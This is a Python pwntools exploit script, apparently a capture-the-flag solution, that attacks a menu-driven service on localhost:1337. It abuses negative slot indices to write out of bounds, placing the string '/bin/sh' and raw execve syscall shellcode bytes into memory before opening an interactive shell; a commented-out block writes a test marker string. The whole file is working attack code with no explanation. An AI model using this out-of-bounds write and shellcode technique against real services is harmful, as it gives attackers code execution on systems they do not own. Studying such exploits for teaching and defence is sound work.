from pwn import *

r = remote('localhost', 1337)

def insert(slot, number):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'slot: ', str(slot).encode())
    r.sendlineafter(b'number: ', number)

offset = -1 * 14700
slots = [0, 2, 4, 6, offset, offset+2, offset+6, offset+12]
rip_sl = [1, 2, 3, 4, 5, 6, 7, 8]
numbers = [b'/b', b'in', b'/s', b'h\x00', b'\x3b\x52', b'\x5e\x48', b'\x8d\x3d', b'\x0f\x05']
ripolus = 'RIPOLUS!'

'''
for i in range(8):
    insert(rip_sl[i], ripolus[i].encode() + b' ')
'''
for i in range(8):
    insert(slots[i]//2, numbers[i])

r.interactive()
